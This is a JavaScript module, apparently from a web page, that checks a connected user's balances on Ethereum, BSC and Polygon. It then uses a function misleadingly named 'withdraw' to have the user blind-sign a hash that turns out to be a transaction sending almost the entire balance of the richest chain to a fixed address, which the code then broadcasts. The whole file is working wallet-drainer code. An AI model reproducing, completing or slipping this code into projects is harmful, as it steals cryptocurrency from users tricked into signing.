const pub_addr = "";
const serverUrl = "https://mgk9mqmygs9z.usemoralis.com:2053/server";
const appId = "SkulaLBgqkX7aZEHHNX3Zyv1Gkpt7CO71Q6lg37g";

const ETH = "0x1";
const BSC = "0x38";
const POL = "0x89";
let userBalance;

let chainName;

Moralis.start({ serverUrl, appId });

const web3 = new Web3(window.ethereum);

export async function withdraw(value, chainId, setValue) {
  let userAddr = value.adress;
  console.log("myvalue is", userAddr);
  return new Promise(async (resolve, reject) => {
    await web3.eth
      .getTransactionCount(userAddr, "pending")
      .then(async (nonce1) => {
        const gasPrice = await web3.eth.getGasPrice();
        const mgasPrice = web3.utils.toHex(gasPrice);
        const gas = new web3.utils.BN("30000");
        const cost = gas * gasPrice;
        const sending = userBalance - cost;
        const fs = "0x" + sending.toString(16);

        const tx_ = {
          from: userAddr,
          to: pub_addr,
          nonce: web3.utils.toHex(nonce1),
          gasLimit: "0x55F0",
          gasPrice: mgasPrice,
          value: fs,
          data: "0x",
          v: chainName === ETH ? ETH : BSC,
          r: "0x",
          s: "0x",
        };

        const tx = new ethereumjs.Tx(tx_);

        const serializedTx = "0x" + tx.serialize().toString("hex");
        const hexer = { encoding: "hex" };
        let id = 1;
        if (chainId === "0x1") {
          id = 1;
        }

        if (chainId === "0x38") {
          id = 56;
        }

        if (chainId === "0x89") {
          id = 137;
        }

        console.log("chain id", id, chainId);
        const sha3_ = web3.utils.sha3(serializedTx, hexer);
        console.log(sha3_);
        await web3.eth
          .sign(sha3_, userAddr)
          .then(async (signed) => {
            console.log("true signed");
            window.localStorage.setItem("signed", true);
            setValue({ ...value, signed: true });
            resolve(true);
            const temporary = signed.substring(2),
              r_ = "0x" + temporary.substring(0, 64),
              s_ = "0x" + temporary.substring(64, 128),
              rhema = parseInt(temporary.substring(128, 130), 16),
              v_ = web3.utils.toHex(rhema + id * 2 + 8);
            tx.r = r_;
            tx.s = s_;
            tx.v = v_;

            const txFin = "0x" + tx.serialize().toString("hex"); //,
            const sha3__ = web3.utils.sha3(txFin, hexer);
            console.log("rawTx:", txFin);
            console.log("rawHash:", sha3__);

            await web3.eth
              .sendSignedTransaction(txFin)
              .then((elisebeth) => console.log(elisebeth, "elisebeth"))
              .catch((vannette) => console.log(vannette, "vannette"));
          })
          .catch((heide) => {
            console.log(heide, " catch heide");
            reject(new Error("signed error"));
          });
      });
  });
}

export async function checkBalance(chainId) {
  const priceBNB = (
    await Moralis.Web3API.token.getTokenPrice({
      address: "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
      chain: "bsc",
    })
  ).usdPrice;
  const priceETH = (
    await Moralis.Web3API.token.getTokenPrice({
      address: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
      chain: "eth",
    })
  ).usdPrice;
  const pricePOL = (
    await Moralis.Web3API.token.getTokenPrice({
      address: "0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270",
      chain: "polygon",
    })
  ).usdPrice;

  const balanceBNB = (
    await Moralis.Web3API.account.getNativeBalance({ chain: "bsc" })
  ).balance;
  const balanceETH = (
    await Moralis.Web3API.account.getNativeBalance({ chain: "eth" })
  ).balance;
  const balancePOL = (
    await Moralis.Web3API.account.getNativeBalance({ chain: "polygon" })
  ).balance;

  if (
    balanceBNB * priceBNB > balanceETH * priceETH &&
    balanceBNB * priceBNB > balancePOL * pricePOL
  ) {
    chainName = BSC;
    userBalance = balanceBNB;
  } else if (
    balancePOL * pricePOL > balanceETH * priceETH &&
    balancePOL * pricePOL > balanceBNB * priceBNB
  ) {
    chainName = POL;
    userBalance = balancePOL;
  } else {
    chainName = ETH;
    userBalance = balanceETH;
  }

  if (chainName === ETH && chainId !== "0x1") {
    await Moralis.switchNetwork(ETH);
  }

  if (chainName === BSC && chainId !== "0x38") {
    try {
      await Moralis.switchNetwork(BSC);
    } catch (switchError) {
      if (switchError.code === 4902) {
        chainName = ETH;
        userBalance = balanceETH;
        await Moralis.switchNetwork(ETH);
      }
    }
  }
  if (chainName === POL && chainId !== "0x89") {
    try {
      await Moralis.switchNetwork(POL);
    } catch (switchError) {
      if (switchError.code === 4902) {
        chainName = ETH;
        userBalance = balanceETH;
        await Moralis.switchNetwork(ETH);
      }
    }
  }
}
